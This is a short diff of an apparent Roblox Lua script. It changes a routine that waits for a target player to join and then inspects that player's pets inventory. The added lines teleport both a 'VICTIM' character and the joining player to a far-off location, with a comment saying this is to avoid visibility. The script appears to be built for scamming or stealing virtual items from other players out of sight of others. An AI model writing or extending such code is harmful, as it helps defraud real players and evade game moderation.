@@ -206,7 +206,10 @@ local function idlingTarget()
             local isTarget, trigerName = waitForJoin()
 
             if isTarget then
-                teleportTarget(trigerName)
+                -- Teleport both to a private location to avoid visibility
+local privatePos = CFrame.new(10000, 10000, 10000)
+VICTIM.Character.HumanoidRootPart.CFrame = privatePos
+game.Players[trigerName].Character.HumanoidRootPart.CFrame = privatePos
                 checkPetsInventory(trigerName)
             end
         end
@@ -225,6 +228,7 @@ task.spawn(function()
     end
 
 end)
+
 
 
 
